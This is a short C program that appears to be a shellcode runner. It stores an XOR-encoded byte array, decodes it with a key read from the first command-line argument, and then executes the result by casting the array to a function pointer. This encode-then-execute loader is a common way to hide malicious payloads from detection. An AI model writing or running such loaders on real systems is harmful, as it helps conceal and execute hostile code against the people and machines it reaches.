
#include <stdio.h>
#include <string.h>
unsigned char shellcode[]=
"\x70\x82\x13\x2c\x45\x04\x58\x43\x43\x04\x04\x49\x42\xa2\xc8\x7b\xa2\xc9\x78\xa2\xca\x1a\xeb\x9b\x20\xe6\xab";
int main(int argc,char **argv)
{
	int i;
	for(i=0;i<strlen(argv[1]);i++){
		shellcode[i]=shellcode[i]^argv[1][i];
	}

    printf("Shellcode size: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
